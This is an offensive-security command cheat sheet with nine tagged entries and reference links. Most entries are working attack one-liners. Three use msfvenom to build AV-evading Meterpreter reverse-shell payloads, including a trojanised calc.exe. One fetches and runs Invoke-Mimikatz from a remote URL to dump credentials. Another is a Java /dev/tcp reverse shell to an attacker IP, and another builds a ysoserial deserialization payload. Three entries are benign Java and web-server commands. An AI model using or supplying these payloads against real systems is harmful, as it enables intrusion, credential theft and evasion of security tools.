### 1. MSF Venom make dll
```
./msfvenom -p windows/meterpreter/reverse_https -f dll -e x86/shikata_ga_nai -i 30 LHOST=[IP] LPORT=443 > /data/Clients/[FILE]
```
**- metasploit,av evasion**
#### References:

https://www.offensive-security.com/metasploit-unleashed/msfvenom/
__________
### 2. Invoke mimicatz, can use with psexec for pwnage
```
powershell "IEX (New-Object Net.WebClient).DownloadString('http://bit.ly/1qMn59d'); Invoke-Mimikatz -DumpCreds"
```
**- passwords,Windows,av evasion,powershell**
#### References:

http://carnal0wnage.attackresearch.com/2013/10/dumping-domains-worth-of-passwords-with.html
https://github.com/clymb3r/PowerShell/tree/master/Invoke-Mimikatz
__________
### 3. instant web server
```
python -m SimpleHTTPServer [PORT]
```
**- pivoting,interesting,python,av evasion**
#### References:

https://docs.python.org/2/library/simplehttpserver.html
__________
### 4. Java reverse shell - replace ; with newline
```
r = Runtime.getRuntime(); p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKING-IP/80;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]); p.waitFor()
```
**- linux,reverse shells,java**
#### References:

https://highon.coffee/blog/reverse-shell-cheat-sheet/
__________
### 5. powershell shell
```
msfvenom -p Windows/meterpreter/reverse_https -f psh -a x86 LHOST=[lhost] LPORT=[lport] audit.ps1
```
**- metasploit,av evasion,powershell**
#### References:

https://www.offensive-security.com/metasploit-unleashed/msfvenom/
__________
### 6. create a evil calc
```
msfvenom --payload windows/meterpreter/reverse_tcp --format exe --template calc.exe -k --encoder x86/shikata_ga_ni -i 5 LHOST=[lhost] LPORT=[lport] evil.exe
```
**- metasploit,av evasion**
#### References:

https://www.offensive-security.com/metasploit-unleashed/msfvenom/
__________
### 7. run a java web start JNLP
```
/opt/jre1.8.0_91/bin/javaws [something].jnlp
```
**- java**
#### References:

https://www.java.com/en/download/faq/java_webstart.xml
__________
### 8. Open java control pannel
```
/opt/jre1.8.0_91/bin/jcontrol
```
**- java**
#### References:

http://linuxsysconfig.com/2013/12/how-to-enable-java-console-on-rpm-based-linux-systems/
__________
### 9. YsoSerial code execution 
```
java -jar ysoserial-0.0.2-all.jar CommonsCollections1 '[command]' > payload.out
```
**- web application,java**
#### References:

https://github.com/frohoff/ysoserial
http://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/
__________
